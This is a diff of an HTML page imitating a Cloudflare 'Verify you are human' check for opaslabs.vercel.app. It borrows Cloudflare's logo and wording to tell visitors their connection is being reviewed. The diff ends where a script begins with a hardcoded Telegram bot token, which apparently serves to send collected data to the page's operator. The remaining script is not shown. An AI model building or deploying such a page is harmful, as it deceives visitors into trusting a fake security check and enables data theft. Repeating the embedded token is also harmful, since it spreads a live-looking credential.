@@ -4,32 +4,43 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Secure Connection Check</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet"/>
   <style>
-    body {
+   body {
       font-family: 'Roboto', sans-serif;
-      background-color: #f4f4f4;
     }
   </style>
-</head>
-<body>
-  <h1>opaslabs.vercel.app</h1>
-  <p>Checking if the site connection is secure</p>
-  <section>
-    <input id="verifyHuman" type="checkbox" />
-    <label for="verifyHuman">Verify you are human</label>
+ </head>
+ <body class="bg-white text-gray-900 p-6 sm:p-10">
+  <main class="max-w-3xl mx-auto">
+   <h1 class="text-3xl font-normal mb-2">
+    opaslabs.vercel.app
+   </h1>
+   <p class="text-lg font-normal mb-6">
+    Checking if the site connection is secure
+   </p>
+   <section class="border border-gray-300 rounded-sm w-fit px-4 py-3 flex items-center space-x-3 mb-6">
+    <input class="w-5 h-5 border border-gray-400 rounded-sm" id="verifyHuman" type="checkbox"/>
+    <label class="text-sm select-none" for="verifyHuman">
+     Verify you are human
+    </label>
     <div class="ml-4 flex flex-col items-center">
-      <img alt="Cloudflare logo orange cloud with text" class="h-6 w-auto" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" />
-      <div class="text-xs text-gray-600 flex space-x-1 mt-0.5">
-        <span>Privacy</span>
-        <span>·</span>
-        <span>Terms</span>
-      </div>
+     <img alt="Cloudflare logo orange cloud with text" class="h-6 w-auto" src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg"/>
+     <div class="text-xs text-gray-600 flex space-x-1 mt-0.5">
+      <span>Privacy</span>
+      <span>·</span>
+      <span>Terms</span>
+     </div>
     </div>
-  </section>
-  <p>opaslabs.vercel.app needs to review the security of your connection before proceeding.</p>
+   </section>
+   <p class="text-base font-normal max-w-xl">
+    opaslabs.vercel.app needs to review the security of your connection before
+      proceeding.
+   </p>
+  </main>
 
   <script>
     const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
